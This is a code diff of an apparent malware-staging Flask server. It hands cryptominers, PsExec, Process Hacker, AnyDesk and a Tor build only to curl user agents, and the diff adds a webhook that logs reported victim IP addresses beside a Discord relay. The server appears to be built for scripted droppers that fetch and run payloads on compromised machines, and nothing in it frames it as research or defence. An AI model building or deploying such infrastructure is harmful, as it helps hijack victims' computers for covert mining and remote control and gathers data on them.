@@ -1,8 +1,9 @@
-from flask import Flask, request, abort, send_file
+from flask import Flask, request, abort, send_file,jsonify
 import requests
 from flask_httpauth import HTTPBasicAuth
 from werkzeug.security import generate_password_hash, check_password_hash
 app = Flask(__name__)
+import json
 
 # OPEN Port 5000 !!!
 
@@ -24,7 +25,7 @@ def verify_password(username, password):
     
 @app.route('/api/download/pm.exe')
 def downloadPhoenixMiner():
-    path = "C:/Users/Administrator/Desktop/ZortosCDN/pm.exe" 
+    path = "/root/ZortosCDN/pm.exe" 
     useragent = request.headers.get('User-Agent')
     if 'curl' in useragent:
         return send_file(path, as_attachment=True)
@@ -35,7 +36,7 @@ def downloadPhoenixMiner():
 
 @app.route('/api/download/TorBuild.zip')
 def downloadTor():
-    path = "C:/Users/Administrator/Desktop/ZortosCDN/TorBuild.zip"
+    path = "/root/ZortosCDN/TorBuild.zip"
     useragent = request.headers.get('User-Agent')
     if 'curl' in useragent:
         return send_file(path, as_attachment=True)
@@ -48,7 +49,7 @@ def downloadTor():
     
 @app.route('/api/download/SexyMiner.exe')
 def downloadSexyMiner():
-    path = "C:/Users/Administrator/Desktop/ZortosCDN/SexyMiner.exe" 
+    path = "/root/ZortosCDN/SexyMiner.exe" 
     useragent = request.headers.get('User-Agent')
     if 'curl' in useragent:
         return send_file(path, as_attachment=True)
@@ -60,7 +61,7 @@ def downloadSexyMiner():
     
 @app.route('/api/download/PsExec.exe')
 def downloadpsexec():
-    path = "C:/Users/Administrator/Desktop/ZortosCDN/PsExec.exe" # Add your own directory
+    path = "/root/ZortosCDN/PsExec.exe" # Add your own directory
     useragent = request.headers.get('User-Agent')
     if 'curl' in useragent:
         return send_file(path, as_attachment=True)
@@ -73,7 +74,7 @@ def downloadpsexec():
 
 @app.route('/api/download/ph64.exe')
 def downloadProccessHack():
-    path = "C:/Users/Administrator/Desktop/ZortosCDN/ph64.exe" #Add your own directory
+    path = "/root/ZortosCDN/ph64.exe" #Add your own directory
     useragent = request.headers.get('User-Agent')
     if 'curl' in useragent:
         return send_file(path, as_attachment=True)
@@ -85,7 +86,7 @@ def downloadProccessHack():
 
 @app.route('/api/download/Anydesk.exe')
 def downloadAnydesk():
-    path = "C:/Users/Administrator/Desktop/ZortosCDN/Anydesk.exe" #Add your own directory
+    path = "/root/ZortosCDN/Anydesk.exe" #Add your own directory
     useragent = request.headers.get('User-Agent')
     
     if 'curl' in useragent:
@@ -97,9 +98,8 @@ def downloadAnydesk():
 
 
 @app.route('/discordwebhook', methods=['POST'])
-def webhook():
+def Discordwebhook():
     if request.method == 'POST':
-        print(request.json)
         result = requests.post(DiscordURL, json=request.json)
         try:
             result.raise_for_status()
@@ -108,6 +108,16 @@ def webhook():
         else:
             print("Payload delivered successfully.".format(
                 result.status_code))
+        return 'success', 200
+    else:
+        abort(400)
+
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    if request.method == 'POST':
+        resp = request.json
+        print(resp['ip'])
+        print(resp['ip'])
         return 'success', 200
     else:
         abort(400)
